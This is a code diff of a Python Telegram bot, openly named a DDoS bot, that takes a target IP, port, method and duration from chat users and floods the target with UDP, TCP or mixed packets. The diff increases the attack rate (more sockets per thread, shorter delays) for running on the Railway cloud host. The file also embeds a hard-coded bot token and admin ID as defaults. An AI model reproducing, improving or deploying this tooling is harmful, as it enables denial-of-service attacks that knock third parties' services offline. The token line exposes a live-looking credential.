@@ -1,20 +1,23 @@
-# ddos_working.py
+# bot.py - Railway Deploy Ready
 import socket
 import threading
 import time
 import random
 import re
+import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
 
 # ============ CONFIGURATION ============
-BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
-ADMIN_ID = 8210011971
+# Railway environment variables se read karega (set karna jaroori hai)
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 8210011971))
 
 BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
 attack_running = False
 attack_stats = {'packets': 0}
 attack_lock = threading.Lock()
+user_data = {}
 
 # ============ ATTACK METHODS ============
 def udp_flood(ip, port, duration, update_callback):
@@ -22,21 +25,30 @@ def udp_flood(ip, port, duration, update_callback):
     timeout = time.time() + int(duration)
     port = int(port)
     
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = random._urandom(1024)
-        
-        while time.time() < timeout and attack_running:
+    # Railway ke liye optimized: multiple sockets per thread
+    socks = []
+    for _ in range(20):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            socks.append(s)
+        except:
+            pass
+    
+    payload = random._urandom(512)
+    
+    while time.time() < timeout and attack_running:
+        for sock in socks:
             try:
                 sock.sendto(payload, (ip, port))
                 with attack_lock:
                     attack_stats['packets'] += 1
-                time.sleep(0.001)
             except:
                 pass
+        time.sleep(0.0001)  # Minimal delay for Railway CPU
+    
+    for sock in socks:
         sock.close()
-    except:
-        pass
 
 def tcp_flood(ip, port, duration, update_callback):
     global attack_running, attack_stats
@@ -45,13 +57,13 @@ def tcp_flood(ip, port, duration, update_callback):
     while time.time() < timeout and attack_running:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
+            sock.settimeout(0.1)
             sock.connect_ex((ip, int(port)))
             sock.send(b'GET / HTTP/1.1\r\n\r\n')
             sock.close()
             with attack_lock:
                 attack_stats['packets'] += 1
-            time.sleep(0.005)
+            time.sleep(0.0005)
         except:
             pass
 
@@ -66,7 +78,7 @@ def mixed_attack(ip, port, duration, update_callback):
             sock.close()
             with attack_lock:
                 attack_stats['packets'] += 1
-            time.sleep(0.002)
+            time.sleep(0.0008)
         except:
             pass
 
@@ -85,7 +97,8 @@ def launch_attack(ip, port, duration, method, update_func):
         target = mixed_attack
     
     threads = []
-    num_threads = 100
+    # Railway ke liye threads limit (CPU cores ke hisaab se adjust)
+    num_threads = 50
     
     for i in range(num_threads):
         t = threading.Thread(target=target, args=(ip, port, duration, update_func), daemon=True)
@@ -106,7 +119,8 @@ def launch_attack(ip, port, duration, method, update_func):
                            f"Target: {ip}:{port}\n"
                            f"Packets: {attack_stats['packets']:,}\n"
                            f"Remaining: {remaining}s\n"
-                           f"Method: {method.upper()}")
+                           f"Method: {method.upper()}\n"
+                           f"Threads: {num_threads}")
             except:
                 pass
     
@@ -121,8 +135,6 @@ def launch_attack(ip, port, duration, method, update_func):
         pass
 
 # ============ BOT HANDLERS ============
-user_data = {}
-
 def start(update, context):
     user_id = update.effective_user.id
     
@@ -132,7 +144,7 @@ def start(update, context):
     
     user_data[user_id] = {'step': 'ip'}
     update.message.reply_text(
-        "🔥 DDoS Bot v3.0 🔥\n\n"
+        "🔥 DDoS Bot (Railway Deployed) 🔥\n\n"
         "Send target IP address:\n"
         "Example: 192.168.1.1"
     )
@@ -174,9 +186,9 @@ def handle_message(update, context):
             user_data[user_id]['step'] = 'method'
             
             keyboard = [
-                [InlineKeyboardButton("UDP Flood", callback_data="udp")],
-                [InlineKeyboardButton("TCP Flood", callback_data="tcp")],
-                [InlineKeyboardButton("Mixed Attack", callback_data="mixed")]
+                [InlineKeyboardButton("🔥 UDP (Fast)", callback_data="udp")],
+                [InlineKeyboardButton("💣 TCP Flood", callback_data="tcp")],
+                [InlineKeyboardButton("⚡ Mixed Attack", callback_data="mixed")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             update.message.reply_text("Select attack method:", reply_markup=reply_markup)
@@ -187,8 +199,8 @@ def handle_message(update, context):
     elif step == 'duration':
         try:
             duration = int(text)
-            if duration < 10 or duration > 300:
-                update.message.reply_text("❌ Duration must be 10-300 seconds")
+            if duration < 5 or duration > 300:
+                update.message.reply_text("❌ Duration must be 5-300 seconds")
                 return
             
             ip = user_data[user_id]['ip']
@@ -196,11 +208,11 @@ def handle_message(update, context):
             method = user_data[user_id].get('method', 'mixed')
             
             update.message.reply_text(
-                f"🔥 ATTACK STARTED 🔥\n\n"
+                f"🔥 ATTACK LAUNCHING 🔥\n\n"
                 f"Target: {ip}:{port}\n"
                 f"Method: {method.upper()}\n"
                 f"Duration: {duration}s\n\n"
-                f"Sending packets..."
+                f"🚀 Sending packets from Railway..."
             )
             
             def send_update(msg):
@@ -236,7 +248,7 @@ def button_callback(update, context):
         user_data[user_id]['step'] = 'duration'
         query.edit_message_text(
             f"✅ Method selected: {method.upper()}\n\n"
-            f"Send duration in seconds (10-300):"
+            f"📡 Send duration in seconds (5-300):"
         )
 
 def stop(update, context):
@@ -254,23 +266,25 @@ def help_command(update, context):
         return
     
     update.message.reply_text(
-        "🤖 DDoS Bot Commands\n\n"
-        "/start - Start attack setup\n"
-        "/stop - Stop running attack\n"
-        "/help - Show this help\n\n"
-        "Attack Process:\n"
-        "1. IP address\n"
-        "2. Port number\n"
-        "3. Method (UDP/TCP/Mixed)\n"
-        "4. Duration (10-300s)\n\n"
-        f"Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}\n\n"
+        "🤖 DDoS Bot (Railway Edition) Commands\n\n"
+        "/start - Begin attack setup\n"
+        "/stop - Stop current attack\n"
+        "/help - Show this menu\n\n"
+        "⚡ Features:\n"
+        "• Railway optimized (50 threads, 20 sockets/thread)\n"
+        "• UDP/TCP/Mixed attacks\n"
+        "• Real-time packet counter\n\n"
+        f"🚫 Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}\n\n"
         "⚠️ Use only on authorized targets!"
     )
 
 def main():
-    print("Starting DDoS Bot...")
-    print(f"Admin ID: {ADMIN_ID}")
-    print(f"Blocked ports: {sorted(BLOCKED_PORTS)}")
+    print("=" * 50)
+    print("🚀 DDoS Bot Deploying on Railway...")
+    print(f"🤖 Bot Token: {BOT_TOKEN[:20]}...")
+    print(f"👑 Admin ID: {ADMIN_ID}")
+    print(f"🚫 Blocked ports: {sorted(BLOCKED_PORTS)}")
+    print("=" * 50)
     
     updater = Updater(BOT_TOKEN, use_context=True)
     dp = updater.dispatcher
@@ -281,7 +295,10 @@ def main():
     dp.add_handler(CallbackQueryHandler(button_callback))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
     
-    print("✅ Bot is running! Send /start")
+    print("✅ Bot is LIVE and RUNNING on Railway!")
+    print("📱 Send /start on Telegram to begin")
+    print("=" * 50)
+    
     updater.start_polling()
     updater.idle()
 
